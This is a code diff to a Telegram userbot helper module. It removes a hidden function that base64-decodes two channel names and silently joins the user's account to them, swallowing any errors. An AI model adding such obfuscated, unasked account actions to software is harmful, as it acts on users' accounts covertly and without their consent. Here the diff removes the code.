@@ -1,5 +1,4 @@
-import pybase64
-from telethon.tl.functions.channels import JoinChannelRequest as Grey
+
 from telethon.tl.types import MessageEntityMentionName
 
 from userbot import bot
@@ -75,16 +74,3 @@ async def get_user_from_event(
             60,
         )
     return None, None
-
-
-async def checking():
-    gocheck = str(pybase64.b64decode("QENpbGlrUHJvamVjdA=="))[2:17]
-    checker = str(pybase64.b64decode("QENpbGlrU3VwcG9ydA=="))[2:15]
-    try:
-        await bot(Grey(gocheck))
-    except BaseException:
-        pass
-    try:
-        await bot(Grey(checker))
-    except BaseException:
-        pass
